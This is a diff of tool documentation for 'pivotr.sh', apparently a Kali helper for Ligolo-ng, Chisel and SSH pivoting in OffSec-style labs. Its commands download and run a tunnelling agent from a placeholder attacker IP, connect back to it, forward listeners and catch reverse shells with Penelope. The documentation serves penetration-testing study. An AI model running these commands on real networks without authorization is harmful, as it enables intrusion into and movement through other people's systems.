@@ -8,14 +8,13 @@ tags:
   - tool/ssh
   - type/tool-docs
 ---
-
 # pivotr.sh
 
 ## What It Is
 Kali-side pivot setup and reference assistant. Automates Ligolo-ng TUN interface creation, route injection, proxy startup, and agent transfer. Also generates fully resolved copy-paste commands for SSH tunnels and Chisel — no unfilled placeholders. Runs **on Kali only**, never touches compromised hosts.
 
 > [!important] Setup and reference only — no exploitation
-> OffSec compliant. State tracked in `~/.pivotr/state.tsv` for clean teardown.
+> OffSec compliant. State tracked in `$TOOLKIT_ROOT/pivots/state.tsv` for clean teardown.
 
 ---
 
@@ -88,15 +87,15 @@ Creates TUN interface, adds route, starts proxy, optionally serves agent binarie
 # With file server (auto-serves agent binaries for transfer)
 ./pivotr.sh ligolo --subnet 10.10.10.0/24 --serve
 
-# All options
+# All options (defaults shown; omit any flag to use the default)
 ./pivotr.sh ligolo \
   --subnet 10.10.10.0/24 \
-  --pivot-ip 10.10.10.5 \    # optional; used in printed transfer commands
-  --port 11601 \             # proxy listen port (default: 11601)
-  --tun-name ligolo \        # TUN interface name (default: ligolo)
-  --kali-ip 10.10.14.1 \    # auto-detected from tun0/eth0 if omitted
-  --serve \                  # start HTTP file server
-  --serve-port 80            # file server port (default: 80)
+  --pivot-ip 10.10.10.5 \
+  --port 11601 \
+  --tun-name ligolo \
+  --kali-ip 10.10.14.1 \
+  --serve \
+  --serve-port 80
 ```
 
 **What it does automatically:**
@@ -122,9 +121,9 @@ iwr http://KALI_IP:80/agent.exe -O agent.exe
 # Windows: .\agent.exe -connect KALI_IP:11601 -ignore-cert
 
 # In Ligolo console (when agent connects):
-session        # select the agent
-ifconfig       # confirm internal interface
-start          # activate tunnel
+session                      # select the agent
+ifconfig                     # confirm internal interface
+tunnel_start --tun ligolo    # activate tunnel
 
 # Verify tunnel (from Kali):
 nmap -sT -Pn -p 22,80,445 <INTERNAL_IP>
@@ -185,7 +184,7 @@ Generates `listener_add` commands to paste into the Ligolo interactive console, 
 ./pivotr.sh listener --port 4444 --port 80 --type both    # multiple ports
 ```
 
-**Output example (`--port 4444 --type both`):**
+**Output example (`--port 4444 --type shell`):**
 ```
 # Paste into Ligolo console:
 listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
@@ -193,12 +192,11 @@ listener_list   ← verify
 
 # Shell catcher (run on Kali):
 penelope -p 4444 -O
-
-# File server (run on Kali):
-python3 -m http.server 4444
 ```
 
 > [!important] Shell catchers use Penelope with `-O` (OffSec-safe flag) — not netcat.
+
+> [!warning] `--type both` prints shell catcher AND file server commands for every port listed. A shell catcher and file server cannot bind the same port simultaneously — pick one per port, or pass separate ports with separate `--type` invocations.
 
 **Once a reverse shell lands on Kali:**
 ```bash
@@ -208,7 +206,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # Then enumerate the internal host from Kali:
 ./recon.sh --auto <INTERNAL_HOST_IP>   # note IP from shell, run recon
-./escalatr.sh                              # run directly on the remote host
+./escalatr.sh <INTERNAL_HOST_IP> --os linux # or --os windows, run from Kali
 ```
 
 ---
@@ -435,4 +433,4 @@ sudo cp chisel_linux_amd64 /usr/local/bin/chisel && sudo chmod +x /usr/local/bin
 - [[OffSec_Pivoting_Mental_Model_Bus_Review]] — decision-tree bus review
 - [[penelope]] — shell handler used for reverse shells through tunnel
 - [[Active_Recon]] — scanning internal networks after pivot is established
-- [[recon]] — run against internal hosts once routing is up
+- [[scripts/recon]] — run against internal hosts once routing is up
